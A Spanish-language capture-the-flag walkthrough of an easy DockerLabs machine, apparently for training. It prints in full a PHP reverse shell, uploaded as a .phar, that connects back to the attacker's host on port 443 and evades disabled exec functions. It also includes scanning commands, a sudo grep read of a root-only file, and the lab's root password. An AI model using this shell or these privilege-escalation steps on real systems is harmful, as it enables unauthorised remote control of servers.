Maquina: DockerLabs

Autor: El Pinguino de Mario

Dificultad: Facil

ping 172.17.0.2 -c 1

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv

Accederemos a la página web

172.17.0.2

Aplicar Fuzzing para descubrir rutas y archivos con extensiones

gobuster dir -t 150 -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

Accedemos al archivo machine.php y descubrimos una página web que permite la subida de archivos

Intentamos subir un archivo que contenga código PHP para ejecutar comandos a nivel del sistema

Creamos un archivo llamado pwned.phar que incluye el siguiente código, lo cual nos permite ejecutar comandos del sistema al enviar un parámetro llamado cmd

    /*<?php /**/
      @error_reporting(0);@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
      $dis=@ini_get('disable_functions');
      if(!empty($dis)){
        $dis=preg_replace('/[, ]+/',',',$dis);
        $dis=explode(',',$dis);
        $dis=array_map('trim',$dis);
      }else{
        $dis=array();
      }
      
    $ipaddr='172.17.0.1';
    $port=443;

    if(!function_exists('WrisYTZ')){
      function WrisYTZ($c){
        global $dis;
        
      if (FALSE !== stristr(PHP_OS, 'win' )) {
        $c=$c." 2>&1\n";
      }
      $gPpr='is_callable';
      $WEBa='in_array';
      
      if($gPpr('passthru')&&!$WEBa('passthru',$dis)){
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($gPpr('system')&&!$WEBa('system',$dis)){
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($gPpr('shell_exec')&&!$WEBa('shell_exec',$dis)){
        $o=`$c`;
      }else
      if($gPpr('popen')&&!$WEBa('popen',$dis)){
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $o.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($gPpr('proc_open')&&!$WEBa('proc_open',$dis)){
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){
          $o.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($gPpr('exec')&&!$WEBa('exec',$dis)){
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }else
      {
        $o=0;
      }
    
        return $o;
      }
    }
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
      $s=@fsockopen("tcp://172.17.0.1",$port);
      while($c=fread($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=WrisYTZ(substr($c,0,-1));
          if($out===false){
            fwrite($s,$nofuncs);
            break;
          }
        }
        fwrite($s,$out);
      }
      fclose($s);
    }else{
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=WrisYTZ(substr($c,0,-1));
          if($out===false){
            @socket_write($s,$nofuncs);
            break;
          }
        }
        @socket_write($s,$out,strlen($out));
      }
      @socket_close($s);
}

Subimos el archivo .phar y confirmaremos que se ha cargado correctamente

172.17.0.2/upload.php

Ahora, necesitamos enviar una shell inversa a nuestra máquina atacante

En nuestra máquina atacante, nos ponemos a la escucha con Netcat en el puerto 443 utilizando el siguiente comando:

nc -nvlp 443

hacemos click en el archivo para abrirlo

Al ejecutar esto, obtendremos una shell inversa en nuestra máquina atacante. Así, estaremos dentro del sistema

Al ejecutar sudo -l, veremos que podemos ejecutar los binarios /usr/bin/cut y /usr/bin/grep como usuario root sin necesidad de proporcionar una contraseña

Si realizamos una búsqueda de archivos .txt en el sistema utilizando el comando:

find / *.txt 2>/dev/null

veremos que hay un archivo en /opt/ llamado nota.txt

Al revisar el contenido de ese archivo, encontramos el siguiente mensaje:

Protege la clave de root, se encuentra en su directorio /root/clave.txt. Menos mal que nadie tiene permisos para acceder a ella

tenemos permisos para ejecutar los binarios grep y cut. Aprovecharemos estos permisos para leer el archivo /root/clave.txt de la siguiente manera:

sudo /usr/bin/grep '' /root/clave.txt

Leemos el archivo, encontramos una posible contraseña: dockerlabsmolamogollon123.

Cambiamos al usuario root y utilizamos la contraseña encontrada

whoami
